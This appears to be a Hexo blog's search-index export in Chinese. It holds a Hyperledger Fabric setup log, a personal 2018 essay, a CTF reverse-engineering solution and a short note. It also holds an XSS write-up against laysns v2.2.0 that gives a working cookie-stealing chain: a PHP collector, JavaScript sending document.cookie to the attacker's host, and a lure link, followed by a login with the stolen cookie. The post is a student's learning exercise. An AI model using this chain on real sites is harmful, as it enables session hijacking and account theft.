&apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Querying chaincode on peer0.org1...</span><br><span class="line">===================== Querying on peer0.org1 on channel &apos;mytest1&apos;... ===================== </span><br><span class="line">Attempting to Query peer0.org1 ...3 secs</span><br><span class="line">+ peer chaincode query -C mytest1 -n mycc -c &apos;&#123;&quot;Args&quot;:[&quot;query&quot;,&quot;a&quot;]&#125;&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">100</span><br><span class="line">===================== Query successful on peer0.org1 on channel &apos;mytest1&apos; ===================== </span><br><span class="line">Sending invoke transaction on peer0.org1 peer0.org2...</span><br><span class="line">+ peer chaincode invoke -o orderer.example.com:7050 --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem -C mytest1 -n mycc --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt -c &apos;&#123;&quot;Args&quot;:[&quot;invoke&quot;,&quot;a&quot;,&quot;b&quot;,&quot;10&quot;]&#125;&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:06:36.914 UTC [chaincodeCmd] chaincodeInvokeOrQuery -&gt; INFO 001 Chaincode invoke successful. result: status:200 </span><br><span class="line">===================== Invoke transaction successful on peer0.org1 peer0.org2 on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Installing chaincode on peer1.org2...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:06:37.117 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:06:37.117 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:06:37.506 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer1.org2 ===================== </span><br><span class="line"></span><br><span class="line">Querying chaincode on peer1.org2...</span><br><span class="line">===================== Querying on peer1.org2 on channel &apos;mytest1&apos;... ===================== </span><br><span class="line">Attempting to Query peer1.org2 ...3 secs</span><br><span class="line">+ peer chaincode query -C mytest1 -n mycc -c &apos;&#123;&quot;Args&quot;:[&quot;query&quot;,&quot;a&quot;]&#125;&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">90</span><br><span class="line">===================== Query successful on peer1.org2 on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">========= All GOOD, BYFN execution completed =========== </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> _____   _   _   ____   </span><br><span class="line">| ____| | \ | | |  _ \  </span><br><span class="line">|  _|   |  \| | | | | | </span><br><span class="line">| |___  | |\  | | |_| | </span><br><span class="line">|_____| |_| \_| |____/</span><br></pre></td></tr></table></figure><h4 id="4、关闭网络"><a href="#4、关闭网络" class="headerlink" title="4、关闭网络"></a>4、关闭网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m up -c mytest1</span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Stopping cli                    ... done</span><br><span class="line">Stopping peer0.org1.example.com ... done</span><br><span class="line">Stopping orderer.example.com    ... done</span><br><span class="line">Stopping peer0.org2.example.com ... done</span><br><span class="line">Stopping peer1.org1.example.com ... done</span><br><span class="line">Stopping peer1.org2.example.com ... done</span><br><span class="line">Removing cli                    ... done</span><br><span class="line">Removing peer0.org1.example.com ... done</span><br><span class="line">Removing orderer.example.com    ... done</span><br><span class="line">Removing peer0.org2.example.com ... done</span><br><span class="line">Removing peer1.org1.example.com ... done</span><br><span class="line">Removing peer1.org2.example.com ... done</span><br><span class="line">Removing network net_byfn</span><br><span class="line">Removing volume net_peer0.org3.example.com</span><br><span class="line">WARNING: Volume net_peer0.org3.example.com not found.</span><br><span class="line">Removing volume net_peer1.org3.example.com</span><br><span class="line">WARNING: Volume net_peer1.org3.example.com not found.</span><br><span class="line">Removing volume net_orderer.example.com</span><br><span class="line">Removing volume net_peer0.org2.example.com</span><br><span class="line">Removing volume net_peer0.org1.example.com</span><br><span class="line">Removing volume net_peer1.org1.example.com</span><br><span class="line">Removing volume net_peer1.org2.example.com</span><br><span class="line">bf5553092b5a</span><br><span class="line">0198acc0e83e</span><br><span class="line">5c0dad0e5b89</span><br><span class="line">Untagged: dev-peer1.org2.example.com-mycc-1.0-26c2ef32838554aac4f7ad6f100aca865e87959c9a126e86d764c8d01f8346ab:latest</span><br><span class="line">Deleted: sha256:b550da58d9213e0d82d7f362212eb84f8bffa0d7751cdfcbaf3258ef75c3f24a</span><br><span class="line">Deleted: sha256:d7dced24e5ba3373a3c3bd736be0a351481a21df9209503a3fa93635e4aa7f46</span><br><span class="line">Deleted: sha256:36739293e8852c3feb37dd3e08eb20f3004494d8eec3cba05c134454178323b1</span><br><span class="line">Deleted: sha256:7190f5476edd042aa64c39fcf7909f194bdc10e85e02ee1cecf21add3756d8a1</span><br><span class="line">Untagged: dev-peer0.org1.example.com-mycc-1.0-384f11f484b9302df90b453200cfb25174305fce8f53f4e94d45ee3b6cab0ce9:latest</span><br><span class="line">Deleted: sha256:4db24b70e9fbd10b3b20b6255011d45ac7fb92a7ee9731b7f8cc6e681e1a0eb6</span><br><span class="line">Deleted: sha256:38880d76d92c07ca6477ab3a899d21f00f76801f05b4adb3aba58d5bcf224bde</span><br><span class="line">Deleted: sha256:23a054642ba1b7f84991df2611f22b2a0894ea81676ecc9bc124f50832d04f12</span><br><span class="line">Deleted: sha256:f1811e1e4784e9e4537e98ba4a1bb86e56ee070ea443a026dc61c1375d6f8c30</span><br><span class="line">Untagged: dev-peer0.org2.example.com-mycc-1.0-15b571b3ce849066b7ec74497da3b27e54e0df1345daff3951b94245ce09c42b:latest</span><br><span class="line">Deleted: sha256:0c1d56951ae35a8d9db90dc3decda420ca2cf0fcbaa8ccbc4aa580de9fdd58f0</span><br><span class="line">Deleted: sha256:4ccfcafb3212b0448c0a106f25f91c59c56d709fd374658d814ba853bc315991</span><br><span class="line">Deleted: sha256:51b7b0c6e633a94040cb799596a52a13480b3b90819594d5f5c5f17b1ecdc632</span><br><span class="line">Deleted: sha256:11473124d5b1ddfe7136f913791002059bbe8d466e2a931a87caf50e6166996f</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> blockchain </tag>
            
            <tag> hyperledger </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019</title>
      <link href="/2018/12/31/2018/"/>
      <url>/2018/12/31/2018/</url>
      
        <content type="html"><![CDATA[<p>今天是2018年最后一天，也没多大感慨，只是闲得慌，随便瞎扯两句。我这人没有什么规划和目标，主要还是前方一片迷茫，没有具体的方向，所以2018所发生的事情大多是我没有预料到的。就像我现在一样，对2019并没有什么特别的期待。计划总是赶不上变化，遇见未知的自己又何尝不好呢？</p><p>我的2018还要从去年学校跨年晚会的那一刻说起，那是和轮滑社的朋友一起跨年，第一次体验学校的跨年晚会，和几个老朋友互道了新年快乐，然后就睡了。接下来的日子一如往昔，并没有什么特别的惊喜。</p><p>元旦到了基本就是要迎接期末考试了，于是大二上结束了，从后面的结果来看，我的考试还算顺利。我又在学校多呆了十天，主要是考科三。一切都很顺利，科三一遍过。后来暑假考了科四，2018，我拿到了驾驶证，从此再也不用担心无证驾驶被抓了。</p><p>回家之前，老爸突然说要给我买个单反。之前老爸就跟我说过，如果我大学拿到了奖学金就给我买单反。我差不多都快忘了这事，这是老爸又提起，他说：“早买早享受“。我觉得挺有道理，很多时候我们做某件事情都喜欢等，等最合适的时间，这样往往就错过了。于是，我有了自己的单反。我其实很早之前就想拥有一款单反，我喜欢照片最本真的样子。然后第二天就去了趟鼓浪屿，想去给相机开开光。那天下起“了小雨，虽然光源不太充足，但是也别有一般趣味。”群芳不厌寒中开，只为翘首盼君来。今日料知君将近，忙引甘露惹尘埃。“我写下了这首小诗来表达心中的喜悦。有人说，眼睛是天然的照相机。这句话不假。我觉得能拍出好的照片的有两种人，一种是学会创造美的人人，一种是发现美的人。想要拍出好的照片，首先眼睛里要有美的存在。眼睛用来发现美，相机用来定格美，如此，生活便美不胜收。</p><p>过年自然是要回家的。还是如往年一年，过年并没有多大的趣味，见几个老友，吹几场牛逼。但是2018不一样，没有趣味，但有感伤。姐姐出嫁了。我清楚的记得那天，上午还是热热闹闹的，等婚车把姐姐接走后，屋里边空荡荡的。老妈倚在门口，对我说：“家里突然少了个人还真有点不习惯”。我那天说了很少的话，姐姐被接走后，我点起了一根烟，发现尼古丁和焦油并没有大家说的那么神奇。后来喝了点啤酒，我其实是不抽烟也不喝酒的。然后头昏昏沉沉的就睡过去了。醒来发现还是空荡荡的。“人生几次此阵容，锣敲鼓捶，似烈马惊鸿。楼上郎妾秋波送，席间宾客欢声浓。 谁知喜事皆倥偬，苦烟浊酒，无济心事重。误以醉梦可消茕，醒来仍旧一场空。”只好填此《蝶恋花》聊以慰藉。</p><p>开学了，刚开始还是很舒服的，周末爬山去植物园，写了一篇小记：</p><p>”寒冬已逝，暖春悄至。恰近日，有灰云盗日，和风藏雨。遂携二三友，作爬山寻木之行。 久居室中，竟不知草木之涩，树花之美。每行两步，便惊于木叶之奇妆，叹于山间之空旷。渐行之，花欲盛，红似深宫娇娘起舞，紫如江湖侠女弄剑；树欲茂，青似少年驭马之英豪，墨如老僧念经之沉稳。至山顶，忽闻松涛阵阵，鸟声潺潺，心窃喜，此景山上有，山下哪得闻？ 置身于山中，唯愿闻之声可入耳，欲观之景可及目。故所闻所见，皆好声好色。叹之，无人之处，花开极盛！遂归记之。“</p><p>去了一次鼓浪屿拍建筑，清明去了东山岛。东山岛的海确实比厦门的好看，碧绿的海，还有贝壳可以捡。后来就渐渐进入了梦魇时期，盼望着这学期早点结束。</p><p>可能是对厦门的早餐过于失望，也可能是觉得好玩。我买了锅和油盐，然后早上就自己捣鼓早餐。有火腿、牛奶、鸡蛋、面包、水果等。体验了一把精致的生活，主要还是太麻烦，也可能是太懒，一个月之后，全部偃旗息鼓了。所以我决定，以后找个媳妇，首先教她做早餐，然后让她每天做给我吃哈哈哈。</p><p>期间过了一次生日，刚好20岁。还记得那天晚上，我在球场打球，没有任何准备。这是，体育部的一群人就冲上来了，他们手里都拿着不同的水果，水果上面写着祝福语。后来我们去了老张吃烧烤，他们还准备了蛋糕，上面写着“心之所向，身之所往”。那天确实很感动，已经很久没有什么能够打动我了。</p><p>5月11号，我去福州参加了信息安全铁人三项赛。那是我大学时期第一次参加比赛，那时的我真的是菜的抠脚，虽然现在是菜的抠手。但那次比赛之后，我有参加许多网络空间安全的比赛，渐渐的锻炼了自己，学到了不少东西，也获得不少奖项。我大学最终的方向也从此确定—-网络安全。直白点，就是黑客。这是一个漫长且有意思的事，我渐渐宅了起来，学习各种知识以及技术，希望某一天，你们懂得。。。</p><p>我有点乏了，有点写不下去了，感觉2018发生了好多事，记忆在不断交错重叠。</p><p>七月，暑假到了。我尝试留起了中分，拍了一组照片。后来姐姐生了，这意味着一个伟大的舅舅诞生了。小学期学了数据恢复，我在一张被格式化的内存卡里面会付出了300多张初中的照片。又再一次看到了青涩的自己，发现自己青涩如初。</p><p>哦，对了。2018，我听了一场GIN的演奏会，吉他上也有他的签名。我也看了一场五月天的演唱会，都是很不错的体验。</p><p>去了次婺源，徽派建筑确实像泼墨山水画。虽然没看到漫山遍野的花，但是晚秋之景也足以让人流连忘返。</p><p>后来开学了，开学之后就很少参加活动了，也很少出去玩。就感觉一直在不停的打比赛。然后就不停的拿奖哈哈，虽然奖项不高。</p><p>说起拿奖，我今年好像还拿了挺多奖的。填学年鉴定的时候，发现了一堆证书。室友看见了，说：“你怎么那么多证书？”我说：“我也不知道哪来这么多鬼东西”。然后我们就哈哈大笑。所有奖项里面最有含金量的当然是国奖，毕竟价值8000。有时候我也很奇怪，我没想过要拿国奖。在填写申请表的时候我才想到，何不试试呢?可能有运气加成，我知道自己几斤几两。</p><p>开学之前立了个flag，这学期尽量不迟到。然后，flag没倒，但是歪了。我差不多把要迟到的课都翘了，我这学期翘的课比我前20年翘的课加起来还多。翘课真的是会上瘾，人总是有侥幸心理。某次翘课没被抓，后面就会越翘越多。新年有个愿望，下学期就不翘课了。</p><p>我大概翘了一个学期的马原，因为它妨碍我搞钱了。说起搞钱，我现在不想读书不想恋爱只想搞钱。这学期除了拿奖学金，打比赛拿奖金之外，我还找了份兼职。我也不知道自己为什么会去找兼职，可能是暑假的时候玩多了太穷了吧，我还记得当时穷到把小黄的押金都退了。兼职是在一个托管班辅导小学生写作业，小学生都挺可爱的，满眼都是十多年前的自己。</p><p>还有什么呢？我记不起来了。哦，对，我买了vps，以后可以随心所欲的上外网了，我也可以“推特治国”了。2018吧，其实我觉得也不算快吧，发生了挺多事，遇见了不一样的自己。2019又会发生什么呢？谁知道呢？</p>]]></content>
      
      
      
        <tags>
            
            <tag> essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>xss_laysns</title>
      <link href="/2018/12/26/xss_laysns/"/>
      <url>/2018/12/26/xss_laysns/</url>
      
        <content type="html"><![CDATA[<p>0x00前言</p><p>这其实是电子数据取证的期末考试案例，考的是云服务器取证。看着很像有xss漏洞的样子，抱着试一试的心态测试了一下，哈哈还真有。后来上网查了一下，好像是被曝出有前台xss漏洞的laysns v2.2.0。不管了，修复是不可能去修复了，有漏洞我就先攻击一波再说。</p><p>0x01漏洞检测</p><p>看到搜索框，心中就燃起了炽烈的求知欲。前段时间有个大佬教了我一段JS代码，一直不明白什么意思，不如搜一搜。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>输入以上代码，就在按下回车的那一刻，突然弹出下面这么一个东西，下了我一跳。</p><p><img src="/2018/12/26/xss_laysns/1.png" alt=""></p><p>好了，果然存在反射型xss，开始攻击。</p><p>0x02跨站脚本攻击</p><p>在攻击之前，一直不明白，为什么这种漏洞叫Cross-site Script。一般测试都只是Script attack，并没有Cross-site。但实际攻击中的JS恶意代码肯定是在攻击者的站点下面。那么，实施什么攻击好呢？盗取cookie吧，简单又惬意。好了，不说废话了，上脚本。</p><p>首先在攻击站点创建cookie.txt用来接收cookie，创建hack.php作为手机cookie的接口，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">    $cookie = $_GET[<span class="string">'q'</span>]; </span><br><span class="line"></span><br><span class="line">    var_dump($cookie); </span><br><span class="line"></span><br><span class="line">    $myFile = <span class="string">"cookie.txt"</span>; </span><br><span class="line"></span><br><span class="line">    file_put_contents($myFile, $cookie); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着创建JS脚本hack.js，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line"></span><br><span class="line">img.src = <span class="string">"http://localhost/hack/hack.php?q="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure><p>最后创建一个HTML页面来诱导用户hack.html,代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://localhost/sns/search.html?ks=%3Cscript+</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">src%3Dhttp%3A%2F%2Flocalhost%2Fhack%2Fhack.js%3E%3C%2Fscript%3E&amp;commend=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">all&amp;ssid=s5-e&amp;search_type=item&amp;atype=&amp;filterFineness=&amp;rr=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">1&amp;pcat=food2011&amp;style=grid&amp;cat="</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>脚本准备好了，接下来就是实施攻击了，打开hack.html，点击click me，页面跳转，cookie.txt收到cookie。用该cookie进行登录。</p><p><img src="/2018/12/26/xss_laysns/2.png" alt=""></p><p>登录成功，攻击完成！</p><p>0x03结语</p><p>由于前端不是很熟，没法实现更高级的攻击，但也学习了一波xss，感受到了跨站脚本攻击的魅力。不过现在的网站，主流浏览器都有各种应对xss的防御策略，想要实施更深层的攻击，还是要继续学习！此篇博客毫无技术含量，仅作学习之余以放松。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>just reverse it</title>
      <link href="/2018/12/10/reverse/"/>
      <url>/2018/12/10/reverse/</url>
      
        <content type="html"><![CDATA[<p>IDA打开程序，查看start函数C伪代码。<br><img src="/2018/12/10/reverse/001.png" alt=""><br>首先来看第一个for循环，它将输入的16个字符分成4部分。v12占20字节，用来存放大小为16字节的str，sub_402573是MD5计算函数，将4个部分的MD5值存放在64字节大小的v6中。具体对应关系如下图(每一格表示一个字节)。<br><img src="/2018/12/10/reverse/002.png" alt=""></p><p>如何看出sub_402573函数是MD5算法，进入该函数，看到两个函数，进入第一个，有一些初始赋值的操作，猜测为MD5。再返回来看v6，v6占64个字节，分成四部分就是16字节，每个字节包含两个十六进制，刚好每部分可以存一个MD5值，进一步猜测为MD5算法。于是动态调试进行验证。</p><p>将程序丢入od，在call sub_402573的地方下断点，运行程序，输入“1234567890123456”，继续运行，跟踪v6所在的内存，如下图，发现与“1234”、“5678”、“9012”、“3456”的MD5值相同，验证猜测。</p><p><img src="/2018/12/10/reverse/003.png" alt=""></p><p>接着到了strtol函数，这是一个C语言库函数。这里的意思是将v12的值转化为十六进制，中间的参数‘0’表示不返回非法字符串，意味着输入的每个字符应该是十六进制字符，否则每一部分可能就少于4个字符。由图2可知v12[3]+3、v12[2]+2、v12[1]+1、v12刚好对应每一部分字符串。</p><p>sub_4025b1函数，v12[3]+3 &gt; v12[2]+2 &gt; v12[1]+1 &gt; v12 &gt; 999，保证输入顺序。</p><p><img src="/2018/12/10/reverse/004.png" alt=""></p><p>sub_402513函数，是这道题最复杂的地方。首先来看传参，a1为输入值的一部分，a2为该部分的MD5值。关于小头位序存储方式，例如1234存为0x 34 12。因此，a2&gt;&gt;4即为MD5值的第一个字符，a2&amp;0xF为第二字符，(a2+1)&gt;&gt;4为第三个字符，(a2+1)&amp;0xF为第四个字符，这里只取MD5前四个字符作比较。</p><p>数字+48和字母+87是将十六进制转为assic码(ord(‘0’-0)=48，ord(‘a’-a)=87)。</p><p>v3是int型，占四个字节，分别为LOBYTE、BYTE1,、BYTE2、BYTE3。因此是将MD5值的3241与原字符串1234作比较，相等则为真。</p><p><img src="/2018/12/10/reverse/005.png" alt=""></p><p>最后和固定字符串进行异或得到flag，编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">                                md5=hashlib.md5()</span><br><span class="line">                                md5.update((i+j+k+l).encode(<span class="string">'utf8'</span>))</span><br><span class="line">                                <span class="keyword">if</span> md5.hexdigest()[:<span class="number">4</span>]==l+j+i+k:</span><br><span class="line">                                        sys.stdout.write(i+j+k+l)</span><br><span class="line"></span><br><span class="line">v3 = <span class="string">"d\x01@flQAizAST\biTB"</span></span><br><span class="line">a = <span class="string">"31795a469327c6e6"</span></span><br><span class="line">flag = strxor(v3,a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nflag&#123;%s&#125;"</span>%flag</span><br></pre></td></tr></table></figure><p>输入字符串为”31795a469327c6e6”，flag为：flag{W0w_Y0u_Crack_1t}</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>note</title>
      <link href="/2018/11/26/note/"/>
      <url>/2018/11/26/note/</url>
      
        <content type="html"><![CDATA[<p>life is beautiful!</p>]]></content>
      
      
      
        <tags>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
